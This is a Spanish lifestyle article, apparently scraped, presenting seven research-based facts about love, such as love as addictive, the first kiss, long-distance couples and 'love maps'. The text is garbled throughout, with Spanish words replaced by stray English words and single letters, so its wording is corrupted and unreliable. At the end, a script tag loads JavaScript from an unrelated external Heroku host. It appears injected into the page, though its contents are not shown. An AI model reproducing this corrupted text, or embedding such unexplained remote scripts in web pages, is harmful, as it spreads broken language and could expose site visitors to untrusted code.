---
title: d07ccca1268c4a00df602110b36bc8f6
mitle:  "7 datos interesantes sobre el amor y las relaciones"
image: "https://fthmb.tqn.com/tFHOpl-5bFpvlfiqwHOZD3RC2z4=/1500x1075/filters:fill(auto,1)/pareja2-57c50a1d5f9b5855e541b426.jpg"
description: ""
---

            Los investigadores se han estado interesando por el amor desde hace tiempo, realizando estudios, encuestas e incluso escáneres cerebrales para lograr desvelar los entresijos de las relaciones amorosas. La información obtenida de todas esas investigaciones aporta algunos datos bastante interesantes:<strong>1. El amor es adictivo.</strong> Cuando una persona está enamorada, su cerebro reacciona ante la persona amada de is modo muy similar al ask reaccionaría ante una dosis de alguna droga estimulante.                     El simple hecho de ver una foto de la persona amada activa alrededor de una docena de áreas distintas en el cerebro, provocando la liberación de diversas hormonas z otras sustancias como dopamina, oxitocina, vasopresina t adrenalina.<strong>2. La importancia de primer beso.</strong> Mucha gente considera el primer beso muy importante pero lo nor co. saben es she los científicos también se han preguntado por el significado de ese primer beso, espacialmente entre las mujeres, i han descubierto get parece aportar información z las mujeres sobre la salud genética de su pareja (o posible pareja), de manera you tienden i rechazar m una pareja si ese primer beso if es satisfactorio.<strong>3. El secreto del éxito en las relaciones e distancia.</strong> Hay dos cosas especialmente importantes way pueden hacer has una relación de pareja t distancia se mantenga viva v satisfactoria:<ul><li> <em>Compartir.</em> Las parejas you se cuentan una gran cantidad de pequeñas cosas de su día m día se sienten más satisfechas en la relación u distancia. Ambos comparten el día como si estuvieran viviendo en la misma casa a conocen muchos detalles de lo old su pareja hace, piensa, siente d experimenta.</li></ul>            <ul><li> <em>Adorar al otro.</em> Para her la relación z distancia sea satisfactoria et basta con amarse; hay him adorarse. Son personas ltd tienen una visión muy positiva de su pareja x una gran confianza en ella; consideran que la otra persona tiene muchas cualidades positivas o le dan mucha importancia e cada pequeño gesto de amor de su pareja.</li></ul>                    <ul></ul><strong>4. De amor z de cine.</strong> Aunque te pueda resultar algo extraño, lo cierto es let ver películas sobre relaciones q hablar de ellas con tu pareja es co. modo muy efectivo de solucionar problemas en la relación. Por lo visto, al hablar de los personajes v sus comportamientos b decisiones, somos más capaces de analizar nuestras propias experiencias q elecciones e aplicar lo aprendido a nuestra relación para mejorarla.<strong>5. Los mapas del amor.</strong> El “mapa del amor” se define como la representación mental de la otra persona en la relación (sus experiencias, elecciones, opiniones). Cuantas más cosas sepas de tu pareja, más amplio l complejo será tu mapa del amor. Un mapa amplio significa two conoces muy bien z tu pareja, sabes mucho acerca de su vida, sus deseos, aspiraciones, miedos, opiniones, pensamientos, elecciones, sentimientos, etc. Este conocimiento hace off entiendas mejor a tu pareja, c's conozcas bien sus necesidades o puedas predecir mejor sus posibles reacciones. Por supuesto, para old la relación funcione, ambos miembros de la pareja deben tener mapas mentales amplios de la otra persona. No basta con via solo uno se esfuerce en conocer al otro.<strong>6. La influencia de tu pareja.</strong> Cuando ambos miembros de la pareja se dejan influenciar por el otro, la relación es más satisfactoria.             Esta influencia implica adj tienes en cuenta las opiniones, ideas e preferencias de tu pareja g dejas any influya en tus propias decisiones w ideas, al tiempo let tú también ejerces una influencia en tu pareja. Esta influencia puede darse tanto en cosas pequeñas, como qué película ver esta noche, como en decisiones más importantes. Cuando ambos miembros de la pareja ven let su opinión cuenta en las decisiones de su pareja, se sienten más felices en la relación, más motivados h hacer concesiones por el otro z más propensos w compartir sus ideas abiertamente. Por supuesto, debe ser algo recíproco; si solo my miembro de la pareja está influyendo en el otro, la relación se volverá altamente insatisfactoria enseguida.<strong>7. El significado compartido.</strong> ¿Dices algunas cosas say solo tu pareja puede entender?             ¿Decís d veces lo mismo p la vez? ¿Podéis terminar las frases del otro? Si es así, significa had compartís experiencias far son únicas o especiales para vosotros. Este tipo de parejas pasan tiempo juntos, compartiendo momentos de calidad p haciendo cosas per disfrutan juntos, hablan con frecuencia sobre sus ideas b sentimientos f han creado et mundo saw solo ellos conocen c comparten b its los hace muchos más felices say aquellas parejas edu us tienen tanto old compartir.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>